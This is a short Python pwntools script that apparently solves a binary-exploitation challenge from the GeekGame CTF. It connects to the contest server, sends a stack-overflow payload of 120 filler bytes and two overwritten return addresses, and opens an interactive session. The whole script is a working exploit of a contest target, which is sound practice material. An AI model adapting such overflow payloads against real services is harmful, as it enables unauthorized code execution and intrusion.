from pwn import *
import time


c = remote("prob10.geekgame.pku.edu.cn", 10010)
c.recvuntil(b"Please input your token: ")
c.sendline(b"13:...")  # token deleted

print(c.recvuntil(b'EOF included!)\n'))

c.sendline(b"0")

print(c.recv(2048))

payload = b"B" * (120) + p64(0x401229) + p64(0x4011b6) + b'\n'
c.send(payload)

#print(c.recv(2048))
c.interactive()
